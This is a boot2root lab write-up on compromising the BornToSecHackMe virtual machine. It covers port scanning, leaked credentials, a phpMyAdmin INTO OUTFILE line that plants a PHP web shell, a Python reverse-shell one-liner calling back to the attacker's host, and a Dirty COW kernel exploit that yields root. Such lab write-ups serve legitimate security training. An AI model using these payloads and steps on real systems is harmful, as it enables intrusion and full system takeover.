# Boot2root - Writeup 3

## 1. Overview
This report documents the successful compromise and privilege escalation of the **BornToSecHackMe** virtual machine. The attack vector progressed from network service enumeration to web-based remote command execution, concluding with a kernel-level exploit to achieve root privileges.

---

## 2. Reconnaissance & Host Discovery
The engagement began with identifying the target's presence on the local network.

**Attacker IP (Kali Linux):** `10.0.2.15`
**Target IP:** `10.0.2.4`

### Initial Port Scan
A detailed Nmap scan was performed to map the attack surface:

```bash
┌──(hxx㉿kali)-[~]
└─$ nmap -sS -sV -O -p- --script vuln 10.0.2.4
PORT    STATE SERVICE  VERSION
21/tcp  open  ftp      vsftpd 2.0.8
22/tcp  open  ssh      OpenSSH 5.9p1
80/tcp  open  http     Apache httpd 2.2.22
143/tcp open  imap     Dovecot imapd
443/tcp open  ssl/http Apache httpd 2.2.22
993/tcp open  ssl/imap Dovecot imapd

| http-enum: 
|   /forum/: Forum
|   /phpmyadmin/: phpMyAdmin
|   /webmail/: SquirrelMail 1.4.22
```

The most significant discovery was the presence of a **Forum**, **phpMyAdmin**, and **Webmail** instance, suggesting a path through the web application layer.

---

## 3. The Foothold: Web Application to Reverse Shell

### Information Leaks
By exploring the forum, a post by user `lmezard` was discovered containing a log dump. A closer inspection revealed a complex string hidden within the "Failed password" attempts: `!q\]Ej?*5K5cy*AJ`.

```bash
┌──(hxx㉿kali)-[~]
└─$ curl -k 'https://10.0.2.4/forum/index.php?id=6' | grep password
...
Oct  5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2<br />
...
```

Using these credentials, we logged into the forum as `lmezard` and retrieved an internal email address from their profile: `laurie@borntosec.net`. Accessing the **SquirrelMail** interface on port 443 with these credentials revealed a sensitive email containing root database credentials:
* **User:** `root`
* **Password:** `Fg-'kKXBj87E:aJ$`

### Web Shell Injection
Armed with root access to **phpMyAdmin**, we utilized the `INTO OUTFILE` privilege to write a PHP command dropper into the writable directory `/var/www/forum/templates_c/`.

**SQL Payload:**
```sql
SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE "/var/www/forum/templates_c/shell.php";
```

### Stabilizing the Shell
To transition from simple command injection to a stable, interactive environment, we initiated a Python reverse shell back to our Kali listener on port `4444`.

**Reverse Shell One-Liner:**
```python
python -c 'from socket import *; import os, pty; s=socket(AF_INET,SOCK_STREAM); s.connect(("10.0.2.15",4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); pty.spawn("/bin/bash")'
```

---

## 4. Privilege Escalation: Dirty COW POKEDATA (CVE-2016-5195)

### System Enumeration
Upon gaining a shell as `www-data`, we executed **LinPEAS** for local enumeration. The script identified a high probability of vulnerability to **Dirty Copy-on-Write (Dirty COW)**.

### The PTRACE_POKEDATA Variant
Due to kernel hardening, a specific variant of the exploit ([c0w.c](https://gist.github.com/KrE80r/42f8629577db95782d5e4f609f437a54)) was selected. This version uses the `PTRACE_POKEDATA` system call to exploit the race condition in the kernel's memory management logic.

**Exploit Execution:**
1. **Download:** We used `wget` to pull the exploit source from a remote repository.
2. **Compilation & Execution:**
```bash
www-data@BornToSecHackMe:/tmp$ gcc -pthread c0w.c -o c0w
www-data@BornToSecHackMe:/tmp$ ./c0w
DirtyCow root privilege escalation
Backing up /usr/bin/passwd.. to /tmp/bak
mmap fa65a000

madvise 0

ptrace 0
```

The exploit successfully poisoned the SUID binary `/usr/bin/passwd`. By racing the `madvise` and `ptrace` threads, it forced the kernel to write our root-spawning shellcode directly into the physical memory page of the `passwd` utility.

### The Moment of Root
Upon execution of the poisoned binary, the race condition occurred, granting a shell with an effective UID of 0.

```bash
www-data@BornToSecHackMe:/tmp$ /usr/bin/passwd
root@BornToSecHackMe:/tmp# id
uid=0(root) gid=0(root) groups=0(root)
root@BornToSecHackMe:/tmp# whoami
root
```

---

## 5. Conclusion
The compromise of this machine demonstrates the dangers of sensitive data leaks in public forums and the critical nature of keeping a kernel patched against memory management vulnerabilities. By chaining a file-write vulnerability with a race condition, full system control was achieved.
